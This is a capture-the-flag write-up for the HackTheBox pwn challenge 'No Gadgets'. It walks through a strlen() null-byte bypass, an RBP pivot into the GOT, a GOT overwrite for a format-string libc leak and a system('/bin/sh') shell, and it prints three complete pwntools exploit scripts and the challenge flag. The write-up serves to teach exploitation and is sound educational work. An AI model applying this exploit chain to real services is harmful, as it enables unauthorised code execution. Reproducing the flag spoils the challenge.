# No Gadgets
> Write-up author: jon-brandy

![image](https://github.com/user-attachments/assets/a14e6d6a-7b1f-4913-84a2-e243c47c8bfc)

## Lessons Learned:
1. Bypass **strlen()** check.
2. Exploiting GLIBC version 2.35 gadgets limitation.
3. Perform GOT overwrite using controlled **RBP**.
4. Forge fake RBP.

## DESCRIPTION:
<p align="justify">In a world of mass shortages, even gadgets have gone missing. The remaining ones are protected by the gloating MEGAMIND, a once-sentient AI trapped in what remains of the NSA's nuclear bunker. Retrieving these gadgets is a top priority, but by no means easy. Much rests on what you can get done here, hacker. One could say too much.</p>

## STEPS:
1. In this challenge, we're given a full setup for the pwn challenge.

![image](https://github.com/user-attachments/assets/9e332a80-dbe8-47a1-b08c-9eb5dc26b4ca)

2. The binary itself is 64 bit, dynamically linked, and not stripped.

![image](https://github.com/user-attachments/assets/5110b458-6cf1-4c40-b017-50c269bc2957)

> BINARY PROTECTIONS

![image](https://github.com/user-attachments/assets/3eccc84b-f954-4f3a-86a3-7ee37243602c)

3. Since we're given the source code, hence we won't need to decompile the binary **to analyze the source**.
4. Upon reviewing it, the bug is very straightforward. Big buffer overflow at the user input, however a buffer check is mitigating our further exploitation.

![image](https://github.com/user-attachments/assets/c1e74311-9cbc-460e-a420-f22b09b17ff6)

5. If the buffer length is bigger than the allocated buffer, hence the binary shall terminated.
6. To bypass the **strlen()** check, we can simply pass **\x00** (null) byte at the start, then send our payload afterwards.
7. It can be done because in nature **strlen()** function read a buffer until it meet a null byte, so by sending **\x00** byte at the start shall assume strlen only read 1 byte then.
8. Now for the ROP technique should buy us time, because the binary is compiled at GLIBC version 2.35 and `_libc_csu_init()` function was removed from GLIBC version 2.34 and up.

![image](https://github.com/user-attachments/assets/15e203ef-1e6b-4be3-a13d-cb99264cb42d)

9. Anyway, remember that there is a register we control upon overflowing the buffer and that is **RBP**. Also noticed at the end of our function a `leave; ret;` instruction is called.

![image](https://github.com/user-attachments/assets/29563d3b-bd05-4137-bb90-2b739549a85a)


#### NOTES:

```MD
## Dissecting the instruction.

1. leave is equivalent to:

mov rsp, rbp   ; Restore the stack pointer (RSP) to the base pointer (RBP)
pop rbp        ; Restore the previous base pointer from the stack

2. ret is equivalent to:

pop rip        ; Pop the return address from the stack into the instruction pointer (RIP)
```

10. Remembering this binary is compiled with **Partial RELRO**, then at this rate, we can weaponize **RBP** to overwrite `strlen@got` with `printf@got`. With this we can obtain Format String Bug (FSB) which resulting to arbitrary read.
11. With this bug, we can leak libc address and relocate libc base. Awesome!

> PROBLEM

12. However, we are against a limitation of partial overwrite due to fgets primitive. **fgets()** function reads a buffer until newline and appends a null byte at the end.
13. Knowing this, our input should always end in `0a00`. In many binary exploits, we use partial overwrites (changing just 1 or 2 bytes of a memory address), but here since the last two bytes are always `\x0a\x00`, **we are forced to overwrite with either** `00` or `0a00`, making precise overwrites tricky.
14. If the address we want to overwrite ends in 0x00, hence we get a very small chance to hitting a correct address (since ASLR is enabled).

> SOLUTION

15. The solution for this is to look for a memory location that can tolerate `0a00` at the end. Usually are `.bss` and  `GOT entry`.
16. Two ways to identify it, are using ghidra or GDB.

> GDB

![image](https://github.com/user-attachments/assets/d8596a2f-c0bd-4efa-b127-3473a3f7c772)

17. Noticed that there are 2 memory regions marked as `rw-p` (readable, writable, not executable, private).
18. One of them should be `GOT entry` and `.bss` region. To check it I used ghidra.

> GHIDRA

![image](https://github.com/user-attachments/assets/1c935bfc-7902-4059-bc8b-18d466ee1fff)

![image](https://github.com/user-attachments/assets/c57aee8e-e516-4b7a-ae8e-ae5336264e5a)


19. Found that `0x404000` is a `GOT Entry` and `.bss` sections. Awesome!

#### NOTES:

```
Private meaning each process gets it's own stack and heap, meaning they should
not be shared with other processes. So if we overwrite a function pointer in
.bss, it's private to your process, so you don't need to worry about other processes
interferring.

The opposite of private is shared (s).
=> Meaning multiple processes can read/write the same memory.
```

20. Now we know that our forged RBP offset should be at `0x404000 + 0x80`, because if you remember the RBP is substract with 0x80. Hence to control the RBP we need to do + 0x80.
21. With this, once `leave; ret;` executed, RSP shall pointed to our fake RBP.

![image](https://github.com/user-attachments/assets/6adb5de3-0dc7-4e15-9c2f-aed3fd7866fd)

21. Afterwards, before returning we need to add stack alignment then return to `fgets` gadget (so we can fill our fake RBP).
22. Anyway as an additional information, our fake RBP starts at `puts@got`.

![image](https://github.com/user-attachments/assets/2a67dc55-c71e-4a83-9c39-13b4036c0fc7)

23. For the fgets gadget, I prefer to use offset `0x40121b` because there is where rdx is set to stdin and some registers are prepared before the actual call to `fgets@plt` (0x40122e).

![image](https://github.com/user-attachments/assets/59089c15-afb3-4bb7-be26-d57b6b66182c)

> STAGE 1 EXPLOIT SCRIPT

```py
from pwn import *
import os

os.system('clear')

exe = './no_gadgets'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)
context.log_level = 'INFO'

sh = process(exe)
# sh = remote('94.237.50.242',55086)

fgets_gadget = 0x40121b
log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
rop = ROP(elf)

# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP

p = flat([
    b'\x00', # bypass strlen
    b'\x90' * 127, # pad to RBP
    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
    rop.find_gadget(['ret']).address, # stack alignment
    fgets_gadget # return to fgets call
])

sh.sendlineafter(b':', p)
sh.interactive()
```

24. Now this time, our input shall clobbered the Global Offset Table (GOT). So we need to understand what to overwrite now, because few GOT functions need to be restored in order to prevent crashes.
25. Based on our first plan, since we want to obtain arbitrary read and `puts@got` is at our control, hence we need to place format specifier at `puts@got`.

> SIMULATION

![image](https://github.com/user-attachments/assets/819cebcf-19aa-44ca-b631-ec6572e8a80c)

```
puts@got -> %p
strlen@got -> ?
printf@got -> ?
fgets@got -> ?
setvbuf@got -> ?
exit@got -> ?
```

26. With this, puts cannot be called again. Because it shall leads to segmentation fault.
27. Now we need to repopulate the other GOT functions with correct address. Let's start by overwrite `strlen@got` with printf call.

![image](https://github.com/user-attachments/assets/16d3bd4d-311c-422b-9b0a-a7c97305048f)

28. For the rest functions, since we don't need it, let's just fill them with their original resolver address. With this, they get resolved again and work correctly.
29. Each PLT entry is a small chunk of assembly code (a stub) that pushes the GOT address for the unresolved function and jumps to the dynamic linker resolver.

![image](https://github.com/user-attachments/assets/6c693157-10aa-4c98-9934-02a0ff785cb7)


30. The reason `offset+6` is our interest, because our goal is to manipulate the execution flow so that it skips the indirect jump at the start of PLT entry.
31. By jumping directly to the `+6` offset in the PLT stub, the payload avoids going through the resolver logic (which could disrupt our exploit).
32. Instead, it executes the next part of the stub, such as direct call to the function or another useful sequence.

#### NOTES FROM IMAGE ABOVE:

```
Offset +6 instruction is at the start of PLT stb, while the second instruction
(the push to the dynamic linker) starts at 6 bytes later

If we add 6 to the address of the PLT entry, we jump past the first jmp instruction
and land directly in the middle of the PLT stub, avoiding the jump to the GOT
and the resolver logic.
```

> EXPLOIT SCRIPT STAGE 2

```py
from pwn import *
import os

os.system('clear')

exe = './no_gadgets'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)
context.log_level = 'INFO'

sh = process(exe)
# sh = remote('94.237.50.242',55086)

fgets_gadget = 0x40121b
log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
rop = ROP(elf)

# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP

p = flat([
    b'\x00', # bypass strlen
    b'\x90' * 127, # pad to RBP
    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
    rop.find_gadget(['ret']).address, # stack alignment
    fgets_gadget # return to fgets call
])

sh.sendlineafter(b':', p)

# [+] CREATE FAKE RBP

'''
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/scorch/Downloads/htb-retired/pwn_no_gadgets/challenge/no_gadgets:
GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7c80ed0 (puts) ◂— endbr64 
[0x404008] strlen@GLIBC_2.2.5 -> 0x401046 (strlen@plt+6) ◂— push 1
[0x404010] printf@GLIBC_2.2.5 -> 0x7ffff7c60770 (printf) ◂— endbr64 
[0x404018] fgets@GLIBC_2.2.5 -> 0x7ffff7c7f400 (fgets) ◂— endbr64 
[0x404020] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c81670 (setvbuf) ◂— endbr64 
[0x404028] exit@GLIBC_2.2.5 -> 0x401086 (exit@plt+6) ◂— push 5
pwndbg> 
'''

p = flat([
    b'%p'*6,
    # 0x401211,
    0x0000000000401216, # replacing strlen@got with printf call
    elf.plt['printf']+0x6, #printf@got
    elf.plt['fgets']+0x6, #fgets@got
    elf.plt['setvbuf']+0x6, #setvbuf@got
    elf.plt['exit']+0x6  #exit@got
])

sh.sendline(p)

sh.interactive()
```

33. Another things to note here that you can't add above 5 %p, because the first argument -> `%p%p%p%p` is passed in RDI and the rest are expected in:

|Register|Argument|
|:------:|:------:|
|RDI|The format string itself|
|RSI| First %p|
|RDX| Second %p|
|RCX| Third %p|
|R8| Fourth %p|
|R9| Fifth %p|

34. Since only the first 6 arguments are passed in registers and RDI is taken by he format string, that leaves 4 %p by default. Then about `R9`, probably passed on the stack because the function call may not have stored useful addresses beyond R8.
35. Anyway, we got a leak!

> RESULT

![image](https://github.com/user-attachments/assets/1eb8386b-37e0-42e1-99a8-cf7f823e6d29)

36. Relocate it using vmmap libc base, shall gave us the libc base.
37. Moving on, passing **AAAAAAAA** noticed that our input overwrite puts@got again at the same offset.

![image](https://github.com/user-attachments/assets/54797363-ac30-4728-a54f-9dd780219b27)

38. Meaning now we can pass `/bin/sh\x00` strings and overwrite strlen with `system@got` to drop a shell!

> FULL EXPLOIT SCRIPT

```py
from pwn import *
import os

os.system('clear')

exe = './no_gadgets'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)
context.log_level = 'INFO'

sh = process(exe)
# sh = remote('94.237.50.242',55086)

fgets_gadget = 0x40121b
log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
rop = ROP(elf)

# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP

p = flat([
    b'\x00', # bypass strlen
    b'\x90' * 127, # pad to RBP
    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
    rop.find_gadget(['ret']).address, # stack alignment
    fgets_gadget # return to fgets call
])

sh.sendlineafter(b':', p)

# [+] CREATE FAKE RBP

'''
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7c80ed0 (puts) ◂— endbr64 
[0x404008] strlen@GLIBC_2.2.5 -> 0x401046 (strlen@plt+6) ◂— push 1
[0x404010] printf@GLIBC_2.2.5 -> 0x7ffff7c60770 (printf) ◂— endbr64 
[0x404018] fgets@GLIBC_2.2.5 -> 0x7ffff7c7f400 (fgets) ◂— endbr64 
[0x404020] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c81670 (setvbuf) ◂— endbr64 
[0x404028] exit@GLIBC_2.2.5 -> 0x401086 (exit@plt+6) ◂— push 5
pwndbg> 
'''

p = flat([
    b'%p'*4,
    0x0000000000401216, # replacing strlen@got with printf call
    elf.plt['printf']+0x6, #printf@got
    elf.plt['fgets']+0x6, #fgets@got
    elf.plt['setvbuf']+0x6, #setvbuf@got
    elf.plt['exit']+0x6  #exit@got
])

sh.sendline(p)

# [+] PARSE LIBC LEAK AND RELOCATE FOR LIBC BASE

sh.recvuntil(b'scratch!\n')
get = sh.recvuntil(b'0xfb')
libc_leak = eval(get[0:14])
log.success(f'LIBC LEAK --> {hex(libc_leak)}')

libc.address = libc_leak - 2202403
log.success(f'LIBC BASE --> {hex(libc.address)}')

# [+] DROP SHELL

p = flat([
    b'/bin/sh\x00',
    libc.sym['system']
])

sh.sendline(p)

sh.interactive()
```

> RESULT

![image](https://github.com/user-attachments/assets/64eda753-fad1-4ddc-9971-118194aba5ec)

39. Awesome! We've pwned it!

## FLAG:

```
HTB{p0p_rD1_i5_0v3RaTed}
```
